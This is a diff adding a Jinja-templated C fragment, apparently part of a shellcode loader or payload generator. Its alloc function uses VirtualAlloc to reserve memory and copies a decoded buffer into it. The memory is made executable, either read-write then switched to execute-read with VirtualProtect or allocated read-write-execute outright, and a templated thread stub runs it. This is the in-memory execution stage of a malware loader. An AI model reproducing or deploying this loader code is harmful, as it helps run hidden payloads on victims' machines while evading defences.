@@ -1,0 +1,30 @@
+{% if section == "globals" %}
+    {% if link.alloc.functions.value in ["dynamic", "direct"] %}
+        {{ function_typedef("VirtualAlloc") }}
+        {{ function_typedef("VirtualProtect") }}
+        {{ function_typedef("CreateThread") }}
+    {% endif %}
+
+    void *alloc(void *decoded, SIZE_T length){
+        {{ function_definition("VirtualAlloc") }}
+        {{ function_definition("VirtualProtect") }}
+
+        {% if link.alloc.protection == "rx" %}
+            VOID *mem = pVirtualAlloc(NULL, length, 0x00002000 | 0x00001000, PAGE_READWRITE);
+            memcpy(mem, decoded, length);
+            {{ createThreadStub("local", "mem", "mem") }}
+
+            DWORD dwSize;
+            pVirtualProtect(mem, length, PAGE_EXECUTE_READ, &dwSize);
+            return mem;
+        {% else %}
+            VOID *mem = pVirtualAlloc(NULL, length, 0x00002000 | 0x00001000, PAGE_EXECUTE_READWRITE);
+            memcpy(mem, decoded, length);
+            {{ createThreadStub("local", "mem", "mem") }}
+            return mem;
+        {% endif %}
+    }
+{% else %}
+    {# Here goes alloc function call #}
+    void *mem = alloc(raw, length);
+{% endif %}
